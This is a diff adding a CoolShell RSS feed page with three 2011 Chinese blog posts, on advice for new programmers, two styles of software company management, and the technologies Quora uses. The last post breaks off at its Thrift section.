@@ -1,0 +1,1834 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>第 17 页 &#8211; 酷 壳 &#8211; CoolShell</title>
+	<atom:link href="https://coolshell.cn/feed?paged=17" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Tue, 03 Jul 2012 04:29:47 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>给程序员新手的一些建议</title>
+		<link>https://coolshell.cn/articles/4976.html</link>
+					<comments>https://coolshell.cn/articles/4976.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 12 Jul 2011 00:37:49 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[职场生涯]]></category>
+		<category><![CDATA[Intern]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[实习生]]></category>
+		<category><![CDATA[程序员]]></category>
+		<category><![CDATA[面试]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4976</guid>
+
+					<description><![CDATA[<p>前段时间因为实习生计划花了很多时间做了实习生招聘的工作，产生的一些想法，写在这里。 这次招聘过程中，我发现我们在校的学生有下面的这些特点： 1）NB的项目。当说...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4976.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4976.html">给程序员新手的一些建议</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>前段时间因为实习生计划花了很多时间做了实习生招聘的工作，产生的一些想法，写在这里。</p>
+<p>这次招聘过程中，我发现我们在校的学生有下面的这些特点：</p>
+<p><strong>1）NB的项目。</strong>当说到自己做过的项目时， 我发现他们做的事都是很NB。要么是研究Linux的底层内核，要么是图像识别处理，要么是推荐算法，要么做高性能计算，要么做数据挖掘，要么是移动方面的协议，还有一些很高深的课题我听不太懂的项目。这让我想起当年我在学校里的实习，对比起我用Java Applet 和 HTML做操作系统的教学课件，或是在公司里用Delphi/PowerBuilder做的那些MIS系统。让我觉得有些汗颜。</p>
+<p><strong>2）OK的解决问题能力。</strong>当问到算法题时，我发现他们的问题解决能力还OK。我一般问1到2个中低难度的算法题和1个基本的面向对象设计的题，都不难。我相信只要在学校里好好学习的人都应该答得出来。无非就是一些基本的算法和基本数据结构操作的问题，和比较基础的面向对象设计的题，说白了就是作业题。可惜的是，只有5%不到的同学能够在不给提示的情况下答出来，70%的人可以在给一定的提示下答出来，15%左右的同学需要提示到几乎给出答案才能答出来，还有10%的同学怎么给提示都答不出来。</p>
+<p><strong>3）WTF的编码能力</strong>。老实说，对于解算法题，我还是比较可以接受的，因为80%左右的同学在给予提示后都能描述出解题的算法，于是，我让他们把这个算法用他们最熟悉的语言写出来。但结果让我出乎意料，一段在解法很清楚的情况下只需要不到30行代码的小算法题，只有一个人能在10分钟几写完，其它的人基本所有的需要30分钟左右（甚至40分钟），有2、3个人居然写不出来。有一个比较极端的case是——有个同学花了十分钟都写不出从一个整型数组中找到最小的正数的代码。这个事让我觉得很惊讶，难道大家在做项目的时候不编程吗？</p>
+<p>对于这种情况，我想给大家以下后一些建议：</p>
+<p><span id="more-4976"></span></p>
+<ul>
+<li>我感到我们在校的学生正如“<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">为什么中国的网页这么烂</a>”中所说的——<strong>他们习惯于获取大量的知识，而从不对这些知识进行思考和总结</strong>。问题不是我们知道多少东西，问题是我们在获取这些知识的时候会不会去思考这些知识后的东西？比如：为什么会有这么多经典的数据结构，数组，链表，树，哈希表，图这些数据结构主要用来解决什么样的问题，他们的优势和劣势是什么？<strong>没有思考过，就不算真正的懂，没有思考过，你将无法应对万变的问题，没有思考过，你将成为书呆子</strong>。</li>
+</ul>
+<ul>
+<li><strong>多多实践而不是研究</strong>。编程不是在实验室做科研搞理论啊，计算机这本就是一个实践性很强的的学科啊，这不是数学，这需要你多多的实践啊。我们不要真以为读的是——计算机科学（Computer Science ）就是搞理论的了，这里面需要很多很多的Engineering的工作。（我实在是很难想像，居然有这么多人写一般难度的程序居然会是那么痛苦的事）</li>
+</ul>
+<ul>
+<li>我在我的新浪微博（<a href="http://weibo.com/haoel" target="_blank">@左耳朵耗子</a>）里说的，我们不要以为做过项目，会写程序，我们就是程序员了。如果你只是在按部就班地写代码，你就是Coder，江湖叫“码农”，不要把自己当成“码农”，我们一定要对自己的代码，自己的设计不停地反思和总结，并精益求精，写程序本来就是一件有价值的事，这就像写篇作文人人都会写，但并不是人人都能把文章写好。<strong>编程和写作都是一样的，这都是在搞创作啊。想做“码农”还是想做“程序员”？自己决定吧</strong>。</li>
+</ul>
+<ul>
+<li><strong>我们的教育的确很“废柴”，但这不是我们成为“废柴”的原因</strong>。如果我们的学习还停留在“别人给我什么我就学什么”的被动学习阶段，那么你真的不懂怎么是学习。虽然，我们的学校里并没有教你什么是“Version Control”，什么是“Coding Style”，什么是“Refactory”，什么是“Code Review”，什么是“Unit Test”，也没有告诉你一些经典的设计的和架构，等等，等等，但是这是什么年代了？这个时代不是像我上学那时——学校机房里上机用的电脑连内存和硬盘都没有，用5寸的低密软盘面对绿色显示器的286，上网还要“猫”，而且贵的要死（一小时22元），而且网上什么都没有时代了。<strong>我们身边有很多很多优秀的人，网上有很多优秀的文章，书店里也有很多不错的书，而且我们的软件开发日趋成熟，如果我们还学不好的话，那么我们就是在犯罪！</strong></li>
+</ul>
+<p>最后，和大家说一下公司的实习生招聘。这个事情其实是毕业生招聘的一个组成部分，也就是说，因为我国教育的问题，再加上学生自己的问题，导致毕业生量多质次的情况很严重，对于公司，其很难从学校招到一个比较不错的毕业生，这种情况已经不是新问题了，所以，也有很多公司都不招刚毕业的学生。因此，通过实习机会了解并招聘毕业生成了很多公司的毕业生招聘的手段。所以，在这里想告诉在校的同学们，千万不要以为实习计划就是字面上的实习。其实，这和正式的招聘没有什么差别，同样也要看你的能力的。</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/250px-Sheldon_Cooper-150x150.jpg" alt="为什么我反对纯算法面试题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_title">为什么我反对纯算法面试题</a></li><li ><a href="https://coolshell.cn/articles/4506.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/0.jpg" alt="再谈“我是怎么招聘程序员的”（上）" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4506.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（上）</a></li><li ><a href="https://coolshell.cn/articles/4490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg" alt="再谈“我是怎么招聘程序员的”（下）" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4490.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（下）</a></li><li ><a href="https://coolshell.cn/articles/3345.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/12/googlequestion-150x150.jpg" alt="140个Google的面试题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3345.html" class="wp_rp_title">140个Google的面试题</a></li><li ><a href="https://coolshell.cn/articles/1870.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/job-interview-150x150.gif" alt="我是怎么招聘程序员的" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1870.html" class="wp_rp_title">我是怎么招聘程序员的</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4976.html">给程序员新手的一些建议</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4976.html/feed</wfw:commentRss>
+			<slash:comments>130</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>软件公司的两种管理方式</title>
+		<link>https://coolshell.cn/articles/4951.html</link>
+					<comments>https://coolshell.cn/articles/4951.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 06 Jul 2011 00:36:43 +0000</pubDate>
+				<category><![CDATA[技术管理]]></category>
+		<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[职场生涯]]></category>
+		<category><![CDATA[BA]]></category>
+		<category><![CDATA[PM]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[Project]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4951</guid>
+
+					<description><![CDATA[<p>这篇文章是我的一个外国的同事Gareth推荐给我的，我和他一起工作过一段时间。他之所以觉得非常不错，是因为这篇文章让他身有体会，他觉得我也一定会有体会，并让我考...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4951.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4951.html">软件公司的两种管理方式</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>这篇文章是我的一个外国的同事Gareth推荐给我的，我和他一起工作过一段时间。他之所以觉得非常不错，是因为这篇文章让他身有体会，他觉得我也一定会有体会，并让我考虑一下翻译到我的blog上来。我看完后觉得很有代表性，而且觉得说得太对了，所以翻译过来，<strong>希望大家都读一读，最好转给你的公司老板</strong>。</p>
+<p>这篇文章来源于 StakeExchange上的一个问题——“<a title="Why do business analysts and project managers get higher salaries than programmers?" href="http://programmers.stackexchange.com/questions/45776/why-do-business-analysts-and-project-managers-get-higher-salaries-than-programmer" target="_blank">为什么BA和PM的薪水要比程序员要高？</a>”，顶在一楼的回复分析了这个原因，并指出了两种管理文化。</p>
+<p style="text-align: center;">———————————————————正文开始————————————————————</p>
+<p>一个简单的回答应该是——“因为在我们的社会里，我们总是会认为薪水和会和职位的层次绑在一起”。但是，这个答案同时也折射出一个事实——我们的薪资是基于我们的所理解的价值，但这并没有解释</p>
+<ol>
+<li><strong>为什么PM（Project Manager）和BA（Business Analysts）在很多软件公司里在组织的上层？</strong></li>
+<li><strong>为什么软件项目团队总是在最底层？</strong></li>
+</ol>
+<p>这两个问题真是非常地值得我们去问，去思考。</p>
+<p>总体来说，这个世界上存在两种不同的软件公司的组织结构。我把他们叫做 <strong>Widget Factory</strong>（小商品工厂） 和 <strong>Film Crews</strong>（电影工作组）.</p>
+<p>Widget Factories 想要去解决 <a href="http://en.wikipedia.org/wiki/Theory_X_and_theory_Y" rel="nofollow">怎么去激发被X理论所影响的人</a> 。X理论由 McGregor提出，这个理论是说，一般人的本性是懒惰的，工作越少越好，可能的话会逃避工作，大部分人对集体（公司，机构，单位或组织等）的目标不关心，因此管理者需要以强迫，威胁处罚，指导，金钱利益等诱因激发人们的工作源动力。于是，经理总是要去做他下属的工作。于是，基于这种前提下所思考出来的管理方式，很自然的就是——整个团队能够容易地被经理一个人所取代，这种团队中的每一个人都很容易被别人取代，在这种团队里，经理的工作能力不断地被加强。因些，这种公司一般使用树形层级的组织结构，而不是水平式的工作角色。</p>
+<p><span id="more-4951"></span></p>
+<p>Widget Factory 管理体系运作于软件需求的某种假设，这种假设需要BA在一个定义地非常明确的并且需要主管项目经理监管的流程的环境下，准备软件的规格说明书。这种软件制造业需要对项目定置足够的可被替换的编程和测试资源。整个工作由事先安排好的预算来驱动，这个预算由PM和BA在初始化business case的时候完成。</p>
+<p>一个 Widget Factory 的公司的管理可以通过观察这个公司员工的谈话方式识别出来。他们很喜欢谈论Resource资源（包括干活的人也叫做resource），Process流程，Operating efficiency运作效率，uniformity一致性， repeatability可重复性，严格在控制对资源的使用，鲜明的工作角色和 鲜明的流程定义（inputs 和 outputs）。他们对实实在在的软件开发漠不关心，他们想要把理想中的软件开发运作变成他们看得见的图画。</p>
+<p>Film Crews 。这种公司认为人是有相当高的智力和创造力的，是自己可以激发自己的（陈皓注：即使没有外界的压力和处罚的威胁，他们一样会努力工作以期达到目的——人们具有自我调节和自我监督的能力），人们努力工作，并且可以享受工作（人们愿意为集体的目标而努力，在工作上会尽最大的努力，以发挥创造力，才智），就像孩子喜欢玩一样。 Film Crews 认为，每一个个体的自已专业能力，要远远优于那种被组织和协调出来的能力。因为经理不再代替每一个人，而树形的层次架构也不能很好的运作——人们不得不以比较复杂和形式合作才能把事搞定。工作职责变得非常地垂直——你需要具有从上到下的而比较宽泛的各种能力（陈皓注：每个人都需要有管理和技术能力），这种管理也就是基于 <a href="http://en.wikipedia.org/wiki/Theory_X_and_theory_Y" rel="nofollow">McGregor的 Y理论</a>。</p>
+<p>对于一个Film Crew 的Director（注：有总监和导演的意思），他了解把一个伟大的软件组合起来的每一个碎片，他需要组织一个无与伦比的团队，并且要帮助这个团队能凝聚在一起，团结在一起工作。他的角色是鼓舞大家，守护着构想（Vision），提供方向和集中大家的精力。团队里的每一个人都很关键，因为“Director”相信软件的结果来自所有的参与者，以及他们的那种独一无二团队工作方式。大家都知道自己是这个事的一个明星，明星效应可以增加成每个人的成功的机会。而他们的构想(Vision)驱动着项目的预算和拨款。</p>
+<p><strong>当我们用报酬来表示的话，</strong> Widget Factories 认为，有价值的东西总是从PM和BA派生出来的，所以他们常驻在管理层的上面，也有相应的报酬，而对于软件团队，只要他们正确地把需求变成可工作的代码后，软件团队就变得无所谓了。PM 和 BA 努力工作来维护他们的权位，他们通常不会让你能得到项目的原始信息。因为团队拿不到项目的原始信息，所以团队就要拼命地制造各种理由来让他们的方案变得有价值，程序员成为了只会从PM和BA那边听从命令的工人。而这种情况反而让Widget Factory 公司放大了他们的那种想法——程序员都是差不多的，就像车间里的工人一样，他们只不过在机械地干一些很复杂的但是很标准的事情。</p>
+<p>与 Widget Factories 公司鲜明的对比，Film Crew 更主张的是平等的工作职能，每个成员都可以不受限制地获得主要的和原始的信息，其鼓励所有人形成自己的价值判断，并且可以自由地选择不同的方式来达到团队的构想。Leadership领导力结构基于人的能力而不是工作角色。报酬折射出这个人是怎么在这个项目中工作的，需要明白这个人为我们的软件创造了多大的价值和产生了怎么样的结果。 在这种环境里，PM的工作显得并不突出，他也许也不太可能是一个有创造力的领导者，工作角色被弱化成了一种行政管理上的支持者，以及团队外部的联系者。BA的部分工作直接被团队取代（在项目早期被Director取代）。</p>
+<p>今天，我们一点也不奇怪，大多数的公司内的软件开发团队以及一些咨询工作运作于 Widget Factories ，其需要依赖于流程来不断地制造那些无聊的软件。在这种情况，惯例上来说，PM和BA要比程序员挣得更多，这是基本一种他们可以创造更多价值的假设。<strong>在这种组强架构和管理里，程序员们很难证明管理是错误的。</strong></p>
+<p><strong>成功的软件公司都会趋于采用 Film Crew 的方式，任何其它的东西都会妨碍他们吸引牛人的能力，因为只有吸引了牛人，你才能创造出伟大的软件</strong>。 在这种公司里，一个好的程序员的收入会高过BA和PM很多。</p>
+<p style="text-align: center;">———————————————————正文结束————————————————————</p>
+<p style="text-align: left;">读完这个贴子，我发现这完全就是在说我上一家公司和现在公司。我上一家公司的经理们最喜欢谈论的就是resource、 process，而他们的Project Manager或Team Manager或Dev Manager几乎不会为软件团队分担真正的软件开发的压力，还不如Widget Factory。哎！第一次看到这么被人系统地表达出来，心中的一些困惑都得到了解答。</p>
+<p style="text-align: left;">你的公司属于哪一种呢？</p>
+<p style="text-align: left;"><em><strong>————更新 &#8211; 2011-7-6 晚————</strong></em></p>
+<p style="text-align: left;">有人在我的新浪微博（<a href="http://weibo.com/haoel" target="_blank">@左耳朵耗子</a>）里说，Widget Factory就是Waterfall，Film Crews就是Agile，在下面的留言里也说Film Crews很像SCRUM。我在这里驳斥一下这种说法：</p>
+<ol>
+<li>我上一家公司也用Agile ，但本质上还是Widget Factory，甚至还不像。</li>
+<li>著名的Thoughtworks中国公司，Agile的倡导者，其实是外包公司，他们的开发团队中也有PM和BA。</li>
+</ol>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/10217.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/Work-Overtime-150x150.jpg" alt="加班与效率" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10217.html" class="wp_rp_title">加班与效率</a></li><li ><a href="https://coolshell.cn/articles/3218.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/8.jpg" alt="开发时间估计" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3218.html" class="wp_rp_title">开发时间估计</a></li><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4951.html">软件公司的两种管理方式</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4951.html/feed</wfw:commentRss>
+			<slash:comments>110</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Quora使用到的技术</title>
+		<link>https://coolshell.cn/articles/4939.html</link>
+					<comments>https://coolshell.cn/articles/4939.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 04 Jul 2011 00:35:37 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Facebook]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[Nginx]]></category>
+		<category><![CDATA[Python]]></category>
+		<category><![CDATA[Quora]]></category>
+		<category><![CDATA[StackExchange]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4939</guid>
+
+					<description><![CDATA[<p>以前向大家介绍过Stack Exchange的系统架构和Facebook的系统架构，今天和大家说说Quora的。本文主要参考了Phil Whelan的这篇文章《...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4939.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4939.html">Quora使用到的技术</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>以前向大家介绍过<a title="Stack Exchange 的架构" href="https://coolshell.cn/articles/3721.html" target="_blank">Stack Exchange的系统架构</a>和<a title="Facebook 的系统架构" href="https://coolshell.cn/articles/4549.html" target="_blank">Facebook的系统架构</a>，今天和大家说说Quora的。本文主要参考了<a title="Phil Whelan" href="http://www.philwhln.com/author/admin/">Phil Whelan</a>的这篇文章《<a href="http://www.philwhln.com/quoras-technology-examined" target="_blank">Quora&#8217;s Technology Examined</a>》。关于Quora是个什么网站我就不多说了，国内对他的C2C网站叫“知乎”。呵呵。我们还是来看看Quora的技术吧。</p>
+<h4>Search-Box</h4>
+<p>Quora只能搜索问题，主题标签，用户名，和主题标题。没有全文搜索，所以，你无法搜索问题和答案的内容。而搜索中使用前缀搜索方式，比如你输入mi，则Microsoft会马上出来。其搜索还会有一些非常简单的模糊匹配的算法。另外，如果有重复的问题，其中一个问题会自动跳转到另一个问题，但是在搜索中还是会出现。搜索中没有拼写检查。</p>
+<p>一开始，他们使用的是一个开源的搜索服务器，叫<a href="http://sphinxsearch.com/">Sphinx</a>。其支持上述的那些功能。现在他们不用这个技术了，因为<a href="http://www.quora.com/What-is-the-best-open-source-solution-for-implementing-fast-auto-complete" target="_blank">受到了一些限制</a>。他们做了一个比较新的解决方案，这个算法由Python实现。</p>
+<p><strong>参看</strong>：<a href="http://www.quora.com/What-libraries-does-Quora-use-for-search"><img decoding="async" loading="lazy" src="http://www.quora.com/favicon.ico" alt="" width="16" height="16" />What libraries does Quora use for search?</a></p>
+<h4>实时查询</h4>
+<p>Quora的查询是非常高速的，其查询请求是通过AJAX的GET请求发送的，结果返回用的是JSON数据格式，但他们解析JSON是在服务器端，而不是通过浏览器的javascript。这么做的原因可能是他们想高亮搜索关键词，似乎使用Client端的Javascript非常不好做。</p>
+<p>Quora的即时搜索好像比较暴力，如果你输入Microsoft（一共9个字符），你会看到其会像后端发送9次查询——每按一个键一次，无论你敲这个单词的速底有多快，每输入一个字符都会发一个请求给后台。对于这样的看上去没有效率的对后台的请求，后台的服务器端会来控制相关的前台请求，所以，就算是前台这样做，也不会增加服务器端的负载，因为后台会做相关的处理。</p>
+<p>Quora的搜索使用HTTP长连接，当你开始敲查询的时候，连接就建立了，这个连接会持续在那里，你下次搜索的时候会继续使用这个连接，除非你60秒没有动作了。</p>
+<p><strong>参看</strong>：<a href="http://www.quora.com/Quora-product/Is-Quora-going-to-implement-full-text-search"><img decoding="async" loading="lazy" src="http://www.quora.com/favicon.ico" alt="" width="16" height="16" />Is Quora going to implement full-text search?</a></p>
+<p><span id="more-4939"></span></p>
+<h4 id="webnode2-and-livenode">Webnode2 和 LiveNode</h4>
+<p>Webnode2 和 LiveNode 是 Quora 内部的系统，其用来管理内容。Webnode2  生成 HTML, CSS 和 JavaScript 并且和 LiveNode 紧紧地耦合在一起，Webnode2主要是用来管理内容在网页上显示的，LiveNode主要是用来做动态网页内容更新的。Charlie Cheever 说，如果他可以从新开始，他 <a href="http://www.quora.com/What-limitations-has-Quora-encountered-due-to-LiveNode-WebNode#answers" target="_blank">第一件事要做的就是重写整个LiveNode</a>.</p>
+<p>Quora的工程师看上去对他们搞的这些东西非常的满意，并且 <a href="http://www.quora.com/What-limitations-has-Quora-encountered-due-to-LiveNode-WebNode#answers">他们也在努力地找到这些东西的弱点</a>。有一个有意思的关于LiveNode的问题是，如果A和B同时正在看相当的一个问题，那么用户A的一些交互动作会影响B的页面。例如，如果A顶了一下某个答案，那么这个答案可能会往上移动。这样的一个显示变化会通过AJAX更新B的浏览器。如果B此时展开了评论，可能会受到影响。</p>
+<p><a href="http://www.quora.com/What-is-LiveNode-written-in">LiveNode 由这些东西写成：</a>Python, C++, and JavaScript. <a href="http://jquery.com/">jQuery</a> ，<a href="http://cython.org/">Cython</a>也用到了。</p>
+<p>因为Quora <a href="http://www.quora.com/Is-Quora-planning-on-open-sourcing-LiveNode">想要对他们的LiveNode开源</a> 并准备把他们的代码分开，做这个事可能需要太多的工作和时间。</p>
+<p>Charlie Cheever 指出 WebNode2 和 <a href="http://www.quora.com/Quora-Infrastructure/What-is-webnode2">有一个叫做 “free and easy website builder” 的 Webnode 的 webnode.com</a> 没有任何的关系。</p>
+<p><strong>参考</strong>：<a href="http://www.quora.com/Quora-product/Is-Quora-going-to-implement-full-text-search"><img decoding="async" loading="lazy" src="http://www.quora.com/favicon.ico" alt="" width="16" height="16" /></a> <a href="http://www.quora.com/Shreyes-Seshasai/Tech-Talk-Webnode2-and-LiveNode" target="_blank">Tech Talk &#8211; Webnode2 and LiveNode</a></p>
+<h4>Amazon Web Service</h4>
+<p>Quora全部host在AWS的EC2和S3上，这对于这些刚刚起步的快速发展的公司非常关键，因为你可以省去了很多硬件和维护的成本。（建一个数据中心并不是所有公司都能干的事）。Quora的操作系统使用Ubuntu Linux，这是非常容易部署和管理。</p>
+<p>其静态页使用了Amazon的CDN的 <a href="http://aws.amazon.com/cloudfront/" target="_blank">Cloudfront</a>服务分发，CloudFront用于所有的静态图片, CSS 和JavaScript。<a href="http://www.quora.com/How-is-Quora-doing-image-uploads-to-Amazon-S3" target="_blank">图片先传到 EC2 服务器</a>，使用 <a href="http://aws.amazon.com/code/134" target="_blank">Pyhon S3 <acronym title="Application Programming Interface ">API</acronym></a> 处理后后传到 S3。</p>
+<h4 id="haproxy-load-balancing">HAProxy Load-Balancing</h4>
+<p><a href="http://haproxy.1wt.eu/" target="_blank">HAProxy </a>作为前端负载均衡服务器，反向代理服务器是 Nginx，Nginx 后面则是 Pylons (<a href="http://spacepants.org/blog/pylons-paste-stack">Pylons + Paste</a>) , 承担动态 Web 请求。</p>
+<p><a href="http://pylonshq.com/">Pylons</a>，是一个轻量级的Web框架，通常都是在Nginx后面使用。选用Pylons就像你在春节先饺子当主食一样。他们把Pylons中的template和ORM取走而使用自己的技术（由Python写成），这个地方就是 <a href="http://www.quora.com/What-languages-and-frameworks-were-used-to-code-Quora">LiveNode 和 WebNode2的地方</a>。</p>
+<h4>Python</h4>
+<p>从facebook出来的Charlie 和 Adam选用了Python而不是PHP。正如Adam指出的——“<a href="http://www.quora.com/Why-did-Quora-choose-Python-for-its-development">Facebook is stuck on that for legacy reasons, not because it is the best choice right now</a>”（Facebook使用PHP并不是因为其好，而是因为历史原因的问题），当然他们也不会使用C#，因为那样一来就会引入一堆微软的东西。当然，也不会是Java，因为Python要比Java更容易写出代码，Scala太年轻了，还需要考验。Ruby看上来很像Python，但是他们对Ruby没有过多的经验。最终还是Python胜出。当然，他们知道Python的弱点是性能和速度，所以，他们在需要速度和性能的地方使用了C/C++。 他们使用Python的版本是2.6。</p>
+<p>使用Python的另一个原因是Python的数据结构和JSON可以很好的映射起来。代码易读性很高。而且有很多的库，调试器和重载器。Quora的B/S结构几乎完全通过JSON进行数据交互。</p>
+<p>他们<a href="http://www.quora.com/Adam-DAngelo/What-version-of-Python-are-you-programming-in-and-what-IDE-do-you-use" target="_blank">没有使用IDE</a>，他们使用得最多的是Emacs，一看就知道这是一个个人的选择，随着他们开发团队的扩大，这个事会得到改变的。</p>
+<p>另外，他们提到了<a href="http://codespeak.net/pypy/dist/pypy/doc/">PyPy</a>，一个让 Python更快更灵活的项目。</p>
+<h4 id="thrift">Thrift</h4>
